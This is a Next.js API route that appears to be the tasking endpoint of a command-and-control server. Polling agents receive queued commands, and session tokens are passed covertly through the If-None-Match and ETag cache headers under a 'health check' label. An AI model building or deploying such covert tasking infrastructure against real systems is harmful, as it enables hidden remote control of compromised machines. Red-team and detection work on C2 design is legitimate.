import { type NextRequest, NextResponse } from "next/server"
import { agentDb, taskQueueDb } from "@/lib/database"
import { randomBytes } from "crypto"

export async function GET(request: NextRequest) {
  try {
    const headers = Object.fromEntries(request.headers.entries())
    // Identify by session key (prefer 'Session', fallback to If-None-Match)
    const sess = headers["session"] || headers["if-none-match"]
    if (!sess) return NextResponse.json({ error: "missing session_key" }, { status: 401 })

    const agent = agentDb.getBySessionKey(sess)
    if (!agent) return NextResponse.json({ error: "invalid session_key" }, { status: 401 })

    // Rotate session token for caller
    const newSession = randomBytes(32).toString("hex")

    // Next queued task (if any)
    const next = taskQueueDb.getNextForAgent(agent.id)
    let payload: any = {}

    if (next) {
      const taskString = `${next.command}${next.args ? " " + next.args : ""}`
      payload.Task = taskString
      // dequeue
      try { taskQueueDb.deleteById(next.id) } catch {}
      // update agent last queued task
      try {
        agentDb.update(agent.id, {
          last_queued_task: taskString,
          current_running_task: taskString,
          session_key: newSession,
          last_seen_timestamp: Date.now(),
          last_callback: new Date().toISOString(),
        })
      } catch {}
    } else {
      // still update last_seen timestamps
      try {
        agentDb.update(agent.id, {
          session_key: newSession,
          last_seen_timestamp: Date.now(),
          last_callback: new Date().toISOString(),
        })
      } catch {}
    }

    const res = NextResponse.json({ session_key: newSession, ...(payload.Task ? { Task: payload.Task } : {}) })
    try { res.headers.set('ETag', newSession) } catch {}
    return res
  } catch (error) {
    console.error("health check error:", error)
    return NextResponse.json({ error: "server error" }, { status: 500 })
  }
}
